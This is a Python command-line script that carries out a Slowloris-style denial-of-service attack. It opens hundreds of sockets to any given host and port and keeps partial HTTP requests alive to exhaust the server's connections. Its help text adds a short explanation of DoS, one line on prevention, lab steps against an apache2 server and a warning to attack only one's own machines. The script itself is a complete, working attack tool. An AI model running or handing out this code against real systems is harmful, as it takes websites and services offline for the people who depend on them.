import argparse, socket, random, time, sys

def DOSattack(ip, port=80, socketsCount = 200, timeout = sys.maxsize):
    def newSocket(ip,port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            sock.send(f"Get /? {random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            sock.send(bytes(bytes("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\r\n".encode("utf-8"))))
            sock.send(bytes(bytes("Accept-Language: en-us,en;q=0.9\r\n".encode("utf-8"))))
            return sock
        except socket.error as sockError:
            print("Error: "+str(sockError))
            time.sleep(0.5)
            return newSocket(ip,port)

    sockets = [newSocket(ip,port) for _ in range(socketsCount)]
    t, i = time.time(), 0
    while(time.time() - t < timeout):
        try:
            for s in sockets:
                try:
                    print(f"Request {i}")
                    s.send(f"X-a: {random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                    i += 1
                except socket.error:
                    sockets.remove(s)
                    sockets.append(newSocket(ip,port))
                time.sleep(15/len(sockets))
        
        except (KeyboardInterrupt, SystemExit):
            print("Stopping DOS attack")
            break


if __name__ == "__main__":
    about ="\nDOS attack:\n"+\
           "A Denial Of Service attack is a cyber attack which targets a network or machine"+\
           "inorder to take it down making it inaccessible for intended users.\n\n"+\
           "Working:\nIn this attack, mutiple web sockets are created and all these sockets send requests to"+\
           "the targeted host on its specified port\n\n"+\
           "Prevention:\nSupervise traffic via a firewall, monitor traffic\n\n"+\
           "How to try it out:\n"+\
           "-Create an apache2 server listening on a particular ip and host\n"+\
           "-On openning a browser you will see it load pretty immediately and serve the required webpage\n"+\
           "-Now DOS this host and port\n"+\
           "-You will observe that this network is heavily crowded and can observe the browser buffering\n\n"+\
           "USE WISELY! DO NOT DOS NETWORKS AND MACHINES YOU DO NOT HAVE CONTROL OVER!"
    parser = argparse.ArgumentParser( description= about, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("host", nargs="?", help="Host IP to DoS attack")
    parser.add_argument("-p", "--port"   , default=80 , type=int)
    parser.add_argument("-s", "--sockets", default=200, type=int)
    parser.add_argument("-t", "--timeout", default=600, type=int)
    args = parser.parse_args()

    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    if not args.host:
        print("Missing host address!")
        parser.print_help()
        sys.exit(1)

    DOSattack(args.host,args.port,args.sockets,args.timeout)
